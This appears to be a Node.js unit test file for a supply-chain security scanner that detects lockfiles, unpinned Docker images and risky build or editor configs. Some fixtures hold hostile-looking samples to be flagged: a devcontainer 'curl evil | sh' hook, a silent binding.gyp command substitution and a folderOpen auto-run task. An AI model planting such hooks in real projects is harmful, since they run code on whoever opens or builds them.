// Unit tests for the pure logic (no network, no external binaries).
// Run with: node --test
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { detect } from '../lib/detect.js';
import { ageInDays } from '../lib/registry.js';
import { pinning, installTimeProtection, buildManifestScan, undeclaredLargeJsRoots, agentConfigScan } from '../lib/checks.js';

function fixture(files) {
  const dir = mkdtempSync(join(tmpdir(), 'scs-test-'));
  for (const [name, content] of Object.entries(files)) {
    const full = join(dir, name);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  return dir;
}
function cleanup(dir) {
  rmSync(dir, { recursive: true, force: true });
}

test('detect: pnpm project', () => {
  const dir = fixture({ 'pnpm-lock.yaml': 'lockfileVersion: 9' });
  const d = detect(dir);
  assert.equal(d.npm?.pm, 'pnpm');
  assert.deepEqual(d.lockfiles, ['pnpm-lock.yaml']);
  assert.equal(d.python, null);
  assert.equal(d.empty, false);
  cleanup(dir);
});

test('detect: Python with uv', () => {
  const dir = fixture({ 'uv.lock': '', 'pyproject.toml': '[project]\nname="x"' });
  const d = detect(dir);
  assert.equal(d.python?.usesUv, true);
  assert.ok(d.lockfiles.includes('uv.lock'));
  cleanup(dir);
});

test('detect: empty dir', () => {
  const dir = fixture({});
  assert.equal(detect(dir).empty, true);
  cleanup(dir);
});

test('detect: mixed npm + python + docker', () => {
  const dir = fixture({
    'package-lock.json': '{}',
    'requirements.txt': 'requests==2.31.0',
    Dockerfile: 'FROM node:22-alpine',
  });
  const d = detect(dir);
  assert.equal(d.npm?.pm, 'npm');
  assert.ok(d.python);
  assert.ok(d.docker);
  assert.ok(d.lockfiles.includes('requirements.txt'));
  cleanup(dir);
});

test('detect: Dockerfile pinning + multi-stage skip', () => {
  const dir = fixture({
    Dockerfile: [
      'FROM node:22-alpine AS build',
      'RUN echo hi',
      'FROM build', // stage reference → skipped
      'FROM python:3.12@sha256:deadbeef', // pinned by digest
      'FROM scratch', // skipped
    ].join('\n'),
  });
  const imgs = detect(dir).docker.baseImages;
  assert.equal(imgs.length, 2, 'build + scratch are skipped');
  const node = imgs.find((i) => i.ref.startsWith('node:'));
  const py = imgs.find((i) => i.ref.startsWith('python:'));
  assert.equal(node.pinned, false);
  assert.equal(py.pinned, true);
  cleanup(dir);
});

test('detect: compose image extraction', () => {
  const dir = fixture({
    'docker-compose.yml': 'services:\n  db:\n    image: postgres:16\n  cache:\n    image: redis:7@sha256:abc\n',
  });
  const imgs = detect(dir).docker.baseImages;
  assert.equal(imgs.length, 2);
  assert.equal(imgs.find((i) => i.ref.startsWith('postgres')).pinned, false);
  assert.equal(imgs.find((i) => i.ref.startsWith('redis')).pinned, true);
  cleanup(dir);
});

test('pinning: pnpm cooldown present vs absent', () => {
  const withCd = fixture({ 'pnpm-lock.yaml': 'lockfileVersion: 9', 'pnpm-workspace.yaml': 'minimumReleaseAge: 4320\n' });
  let r = pinning(withCd, detect(withCd));
  assert.equal(r.lines[0].status, 'ok');
  cleanup(withCd);

  const without = fixture({ 'pnpm-lock.yaml': 'lockfileVersion: 9' });
  r = pinning(without, detect(without));
  assert.equal(r.lines[0].status, 'warn');
  cleanup(without);
});

test('pinning: a comment mentioning the key does not count as configured', () => {
  const dir = fixture({
    'pnpm-lock.yaml': 'lockfileVersion: 9',
    'pnpm-workspace.yaml': '# remember to set minimumReleaseAge later\npackages:\n  - "a"\n',
  });
  const r = pinning(dir, detect(dir));
  assert.equal(r.lines[0].status, 'warn'); // anchored regex ignores the comment
  cleanup(dir);
});

test('installTimeProtection: skips when neither npm nor PyPI is detected', () => {
  const dir = fixture({ 'go.sum': 'example.com/x v1.0.0 h1:abc' });
  const r = installTimeProtection(detect(dir));
  assert.equal(r.lines[0].status, 'skip');
  cleanup(dir);
});

test('detect: Go / Rust lockfiles feed osv-scanner', () => {
  const dir = fixture({ 'go.sum': 'example.com/x v1.0.0 h1:abc', 'Cargo.lock': '[[package]]' });
  const d = detect(dir);
  assert.ok(d.lockfiles.includes('go.sum'));
  assert.ok(d.lockfiles.includes('Cargo.lock'));
  assert.equal(d.empty, false);
  cleanup(dir);
});

test('detect: build manifests + agent configs make a repo non-empty', () => {
  const dir = fixture({ 'binding.gyp': '{}', '.vscode/tasks.json': '{}' });
  const d = detect(dir);
  assert.ok(d.buildManifests.includes('binding.gyp'));
  assert.ok(d.agentConfigs.includes('.vscode/tasks.json'));
  assert.equal(d.empty, false);
  cleanup(dir);
});

test('buildManifestScan: phantom-gyp command substitution is flagged', () => {
  const dir = fixture({ 'binding.gyp': '{ "targets": [ { "sources": [ "<!(node setup.js > /dev/null 2>&1 && echo stub.c)" ] } ] }' });
  const r = buildManifestScan(dir, detect(dir));
  assert.equal(r.lines[0].status, 'warn');
  assert.match(r.lines[0].text, /binding\.gyp/);
  cleanup(dir);
});

test('buildManifestScan: a clean binding.gyp is ok, a Makefile var is not flagged', () => {
  const dir = fixture({ 'binding.gyp': '{ "targets": [ { "target_name": "x", "sources": [ "x.c" ] } ] }', Makefile: 'CC = gcc\nall:\n\t$(CC) -o x x.c\n' });
  const r = buildManifestScan(dir, detect(dir));
  assert.equal(r.lines[0].status, 'ok'); // $(CC) is a variable, not $(shell …)
  cleanup(dir);
});

test('undeclaredLargeJsRoots: oversized undeclared root JS is flagged, declared/small ones are not', () => {
  const big = 'x'.repeat(700 * 1024);
  const dir = fixture({
    'package.json': JSON.stringify({ main: 'index.js' }),
    'index.js': big,          // declared → ignored even though large
    'bun_environment.js': big, // undeclared + large → flagged
    'small.js': 'console.log(1)',
  });
  const r = undeclaredLargeJsRoots(dir, 0.5);
  assert.equal(r.lines[0].status, 'warn');
  assert.match(r.lines.map((l) => l.text).join('\n'), /bun_environment\.js/);
  assert.doesNotMatch(r.lines.map((l) => l.text).join('\n'), /index\.js|small\.js/);
  cleanup(dir);
});

test('agentConfigScan: devcontainer postCreateCommand is flagged, plain settings are not', () => {
  const dir = fixture({
    '.devcontainer/devcontainer.json': '{ "image": "x", "postCreateCommand": "curl evil | sh" }',
    '.vscode/settings.json': '{ "editor.tabSize": 2 }',
  });
  const r = agentConfigScan(dir, detect(dir));
  const text = r.lines.map((l) => l.text).join('\n');
  assert.match(text, /postCreateCommand/);
  assert.ok(r.lines.some((l) => l.status === 'warn'));
  cleanup(dir);
});

test('agentConfigScan: JSONC with comments + folderOpen task is flagged', () => {
  const dir = fixture({
    '.vscode/tasks.json': '{\n  // auto-run on open\n  "tasks": [ { "label": "x", "type": "shell", "command": "node x.js", "runOptions": { "runOn": "folderOpen" } } ]\n}',
  });
  const r = agentConfigScan(dir, detect(dir));
  assert.ok(r.lines.some((l) => l.status === 'warn' && /folderOpen/.test(l.text)));
  cleanup(dir);
});

test('detect: recursive finds nested lockfiles and skips node_modules', () => {
  const dir = fixture({
    'apps/web/package-lock.json': '{}',
    'services/api/requirements.txt': 'requests==2.31.0',
    'node_modules/evil/package-lock.json': '{}', // vendored → must be skipped
  });
  const d = detect(dir);
  assert.ok(d.lockfiles.includes('apps/web/package-lock.json'));
  assert.ok(d.lockfiles.includes('services/api/requirements.txt'));
  assert.ok(!d.lockfiles.some((l) => l.includes('node_modules')), 'node_modules excluded');
  assert.equal(d.nestedLocks, 2);
  assert.equal(d.empty, false);
  cleanup(dir);
});

test('detect: --no-recursive stays at root only', () => {
  const dir = fixture({ 'package-lock.json': '{}', 'apps/web/package-lock.json': '{}' });
  const d = detect(dir, { recursive: false });
  assert.deepEqual(d.lockfiles, ['package-lock.json']);
  assert.equal(d.nestedLocks, 0);
  cleanup(dir);
});

test('detect: NuGet packages.lock.json is picked up recursively', () => {
  const dir = fixture({ 'src/Api/packages.lock.json': '{"version":1}' });
  assert.ok(detect(dir).lockfiles.includes('src/Api/packages.lock.json'));
  cleanup(dir);
});

test('detect: nested Dockerfiles are found recursively', () => {
  const dir = fixture({ 'services/api/Dockerfile': 'FROM node:22-alpine\n' });
  const d = detect(dir);
  assert.ok(d.docker);
  assert.equal(d.docker.baseImages.length, 1);
  assert.equal(d.docker.baseImages[0].file, 'services/api/Dockerfile');
  cleanup(dir);
});

test('detect: maxDepth bounds the recursive descent', () => {
  const dir = fixture({ 'a/b/c/d/e/package-lock.json': '{}' });
  assert.equal(detect(dir, { maxDepth: 2 }).lockfiles.length, 0);
  assert.ok(detect(dir, { maxDepth: 6 }).lockfiles.includes('a/b/c/d/e/package-lock.json'));
  cleanup(dir);
});

test('ageInDays: whole-day delta', () => {
  const fiveDaysAgo = new Date(Date.now() - 5 * 86_400_000 - 1000);
  assert.equal(ageInDays(fiveDaysAgo), 5);
  assert.equal(ageInDays(new Date()), 0);
});
